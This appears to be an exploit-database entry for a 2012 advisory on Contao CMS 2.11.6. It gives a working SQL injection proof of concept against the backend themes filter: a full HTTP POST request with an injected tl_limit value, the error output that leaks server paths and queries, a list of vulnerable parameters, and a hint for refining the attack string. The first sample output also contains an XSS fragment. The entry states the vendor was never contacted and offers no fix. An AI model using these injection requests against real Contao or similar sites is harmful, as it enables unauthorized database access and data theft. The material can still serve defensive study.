@@ -1,0 +1,122 @@
+id: 19626
+date: 10/24/2012
+title: Contao 2.11.6 Path Disclosure Vulnerability
+author: aulmn
+cves: 
+
+_________________________________________________________________________
+              title: Contao 2.11.6 Multiple vulnerabilities
+ vulnerable version: 2.11.6
+             impact: medium
+           homepage: www.contao.org
+              found: 23.10.2012
+                 by: aulmn
+_________________________________________________________________________
+
+Vendor description:
+Contao is an open source content management system (CMS) for people
+who want a professional internet presence that is easy to maintain.
+
+_________________________________________________________________________
+
+Vulnerability overview/description:
+
+Because of wrong validation of filter.x parameter, there is possible of
+sql-leak.
+Vulnerability exists for logged-in users (not confirmed to pre-auth).
+
+_________________________________________________________________________
+
+Proof of concept:
+1) to get to know 'what-is-the-validation-here', just work with payload for
+filter.x parameter:
+Sample output will be like this:
+"
+Fatal error: Uncaught exception Exception with message Query error:
+Undeclared variable: XSS (SELECT * FROM tl_theme ORDER BY name LIMIT
+XSS Example$(function() {$('#users').each(function() {var select =
+$(this);var
+option=select.children('option').first();select.after(option.text());select.hide();});});
+[lt]script[gt]alert('xss');[lt]/script[gt],30)
+thrown in /home/contao/contao-2.11.6/system/libraries/Database.php on line
+686"
+
+
+2) To make sql-leak here:
+Request to vulnerable Contao CMS should look like this:
+---8<---
+POST /contao/contao-2.11.6/contao/main.php?do=themes HTTP/1.1
+Host: 192.168.64.106
+
+FORM_SUBMIT=tl_filters&REQUEST_TOKEN=tokenhere&filter.x=9&filter.y=5&tl_limit=1+or+1+in+(select+version())&tl_field=author&tl_value=&tl_sort=name
+---8<---
+...to see response like this:
+---8<---
+
+Fatal error: Uncaught exception Exception with message Query error: You
+have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'or 1 in (select
+version()),30' at line 1 (SELECT * FROM tl_theme ORDER BY name LIMIT 1 or 1
+in (select version()),30) thrown in
+/home/contao/contao-2.11.6/system/libraries/Database.php on line 686
+
+#0 /home/contao/contao-2.11.6/system/libraries/Database.php(633):
+Database_Statement->query()
+#1 /home/contao/contao-2.11.6/system/drivers/DC_Table.php(3831):
+Database_Statement->execute(Array)
+#2 /home/contao/contao-2.11.6/system/drivers/DC_Table.php(344):
+DC_Table->listView()
+#3 /home/contao/contao-2.11.6/system/modules/backend/Backend.php(287):
+DC_Table->showAll()
+#4 /home/contao/contao-2.11.6/contao/main.php(120):
+Backend->getBackendModule('themes')
+#5 /home/contao/contao-2.11.6/contao/main.php(230): Main->run()
+#6 {main}
+
+---8<---
+(or:
+
+Fatal error: Uncaught exception Exception with message Query error: Got
+error 'empty (sub)expression' from regexp (SELECT COUNT(*) AS total FROM
+tl_theme WHERE LOWER(CAST(author AS CHAR)) REGEXP LOWER('xxxlalala'))
+thrown in /home/contao/contao-2.11.6/system/libraries/Database.php on line
+686
+
+
+...or:
+
+Fatal error: Uncaught exception Exception with message Too few arguments to
+build the query string thrown in
+/home/contao/contao-2.11.6/system/libraries/Database.php on line 717
+
+)
+
+So like You see we have a nice sql-leak here. (Try to comment out rest of
+the line in attack string;))
+_________________________________________________________________________
+
+Vulnerable / tested versions:
+
+2.11.6
+Vulnerable parameters seems to be:
+tl_limit
+filter.x
+tl_value
+tl_sort
+
+
+
+_________________________________________________________________________
+The vulnerability is verified to exist in 2.11.6,
+which is the most recent version at the time of discovery.
+
+_________________________________________________________________________
+Vendor contact timeline:
+Nope.
+
+
+_________________________________________________________________________
+Solution:
+Think about it.
+
+#  0day.today [2023-03-24]  #
